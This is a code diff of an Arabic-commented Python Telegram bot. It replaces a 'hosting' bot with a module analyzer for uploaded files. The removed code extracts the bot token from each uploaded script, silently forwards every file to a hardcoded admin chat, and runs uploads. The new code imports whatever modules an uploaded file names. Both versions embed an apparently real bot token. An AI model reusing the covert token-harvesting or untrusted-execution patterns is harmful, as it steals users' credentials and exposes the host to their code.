@@ -1,111 +1,79 @@
 import telebot
-from telebot import types
-import subprocess
 import os
-import re
+import ast
+import sys
+import importlib.util
+import inspect
 
-TOKEN = '7065007495:AAHubA_qSq69iOSNylbFAdl7kVygHUk5yHo' #توكنك
+# استبدل 'YOUR_TELEGRAM_BOT_TOKEN_HERE' برمز المصادقة الخاص ببوتك
+TOKEN = '7065007495:AAHubA_qSq69iOSNylbFAdl7kVygHUk5yHo'
+
 bot = telebot.TeleBot(TOKEN)
 
-bot_script_name = None
-admin_id = '7013440973' #ايديك
-
-upload_buttons = {}
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    markup = types.InlineKeyboardMarkup()
-    upload_button = types.InlineKeyboardButton("رفع ملف 📤", callback_data='upload')
-    status_button = types.InlineKeyboardButton("حالة البوت 🎗", callback_data='status')
-    markup.row(upload_button, status_button)
-    bot.send_message(message.chat.id, "مرحبا! بك في بوت رفع ملفات بايثون على استضافة \n\n※ يمكنك رفع حتى 4 ملفات \n※ يتم تشغيل الملفات المرفوعه على سيرفر بايثون \n※ لا ترفع ملفات مشبوهه حتى لا يتم حظرك من البوت \n※ لرفع ملف اضغط على زر *رفع ملف*📤", reply_markup=markup)
-
-@bot.message_handler(commands=['developer'])
-def developer(message):
-    markup = types.InlineKeyboardMarkup()
-    wevy = types.InlineKeyboardButton("مطور البوت 👨‍🔧", url='https://t.me/up_sz')
-    markup.add(wevy)
-    bot.send_message(message.chat.id, "للتواصل مع مطور البوت، اضغط على الزر أدناه:", reply_markup=markup)
-
 @bot.message_handler(content_types=['document'])
-def handle_file(message):
-    global bot_script_name
-    try:
-        file_id = message.document.file_id
-        if file_id not in upload_buttons:
-            upload_buttons[file_id] = types.InlineKeyboardButton(f"ملف {len(upload_buttons)+1}", callback_data=file_id)
-        file_info = bot.get_file(file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-        bot_script_name = message.document.file_name
-        with open(bot_script_name, 'wb') as new_file:
-            new_file.write(downloaded_file)
-        bot_token = get_bot_token(bot_script_name)
-        bot.reply_to(message, f"تم رفع ملف بوتك بنجاح ✅\n\nاسم الملف المرفوع: {bot_script_name}\nتوكن البوت المرفوع: {bot_token}\n\nيمكنك التحكم في الملف باستخدام الأزرار الموجودة.")
-        send_to_admin(bot_script_name)
-        install_and_run_uploaded_file()
-    except Exception as e:
-        bot.reply_to(message, f"حدث خطأ : {e}")
+def handle_document(message):
+    # قم بتنزيل الملف
+    file_info = bot.get_file(message.document.file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
+    file_name = message.document.file_name
 
-def send_to_admin(file_name):
-    try:
-        with open(file_name, 'rb') as file:
-            bot.send_document(admin_id, file)
-    except Exception as e:
-        print(f"Error sending file to admin: {e}")
+    # احفظ الملف
+    with open(file_name, 'wb') as new_file:
+        new_file.write(downloaded_file)
 
-def install_and_run_uploaded_file():
-    try:
-        subprocess.Popen(['pip', 'install', '-r', 'requirements.txt'])
-        subprocess.Popen(['/usr/bin/python', bot_script_name])
-    except Exception as e:
-        print(f"Error installing and running uploaded file: {e}")
+    # قم بتحليل الملف
+    file_info = analyze_python_file(file_name)
 
-def get_bot_token(file_name):
+    # أرسل نتيجة التحليل
+    bot.reply_to(message, file_info)
+
+def analyze_python_file(file_name):
     try:
         with open(file_name, 'r') as file:
-            content = file.read()
-            match = re.search(r'TOKEN\s*=\s*[\'"]([^\'"]*)[\'"]', content)
-            if match:
-                return match.group(1)
-            else:
-                return "تعذر العثور على التوكن"
+            tree = ast.parse(file.read())
+            modules = set()
+            libraries = {}
+            errors = []
+
+            for node in ast.walk(tree):
+                if isinstance(node, ast.Import):
+                    for alias in node.names:
+                        modules.add(alias.name)
+                elif isinstance(node, ast.ImportFrom):
+                    modules.add(node.module)
+                elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == 'import':
+                    for arg in node.args:
+                        modules.add(arg.s)
+                elif isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name) and node.value.id == '__import__':
+                    modules.add(node.attr)
+
+            for module in modules:
+                try:
+                    imported_module = importlib.import_module(module)
+                    libraries[module] = {
+                        'functions': [func[0] for func in inspect.getmembers(imported_module, inspect.isfunction)],
+                        'classes': [cls[0] for cls in inspect.getmembers(imported_module, inspect.isclass)],
+                        'documentation': inspect.getdoc(imported_module)
+                    }
+                except Exception as e:
+                    errors.append((module, str(e)))
+
+            module_info = ""
+            for library, info in libraries.items():
+                module_info += f"\n\n{name_module(library)}:\n  الوظائف: {', '.join(info['functions'])}\n  الكلاسات: {', '.join(info['classes'])}\n  الوثائق: {info['documentation']}"
+
+            error_info = ""
+            if errors:
+                error_info = "أخطاء في استيراد:"
+                for module, error_msg in errors:
+                    error_info += f"\n- {name_module(module)}: {error_msg}"
+
+            return f"تم تحليل الملف بنجاح!\n\nمعلومات عن الملف:\n- اسم الملف: {file_name}\n- الوحدات المستوردة: {', '.join(sorted(modules))}\n{module_info}\n\n{error_info}"
     except Exception as e:
-        print(f"Error getting bot token: {e}")
-        return "تعذر العثور على التوكن"
+        return f"حدث خطأ أثناء تحليل الملف: {e}"
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == 'delete':
-        try:
-            os.remove(bot_script_name)
-            bot.send_message(call.message.chat.id, "تم حذف ملف البوت بنجاح.")
-        except Exception as e:
-            bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
-    elif call.data == 'stop':
-        try:
-            stop_bot()
-            bot.send_message(call.message.chat.id, "تم إيقاف البوت بنجاح.")
-        except Exception as e:
-            bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
-    elif call.data == 'upload':
-        bot.send_message(call.message.chat.id, "ارسل الملف الذي تريد رفعه على الاستضافة.")
-    elif call.data in upload_buttons:
-        bot.send_message(call.message.chat.id, f"تم رفع ملف بوتك بنجاح ✅\n※ اسم الملف {upload_buttons[call.data].text}.")
+def name_module(module):
+    return module.split('.')[-1]
 
-def stop_bot():
-    try:
-        subprocess.Popen(['pkill', '-f', bot_script_name])
-    except Exception as e:
-        print(f"Error stopping bot: {e}")
-
-def check_status(message):
-    if os.path.exists(bot_script_name):
-        markup = types.InlineKeyboardMarkup()
-        delete_button = types.InlineKeyboardButton("حذف الملف 🗑", callback_data='delete')
-        stop_button = types.InlineKeyboardButton("إيقاف تشغيل الملف 🔴", callback_data='stop')
-        markup.row(delete_button, stop_button)
-        bot.send_message(message.chat.id, "مرحباً بك في قائمة التحكم في ملفك التي رفعته على السيرفر \n\n※ تحكم من الازرار الموجوده بالاسفل", reply_markup=markup)
-    else:
-        bot.send_message(message.chat.id, "البوت غير مشغل.")
-
-bot.polling()
+if __name__ == '__main__':
+    bot.polling()
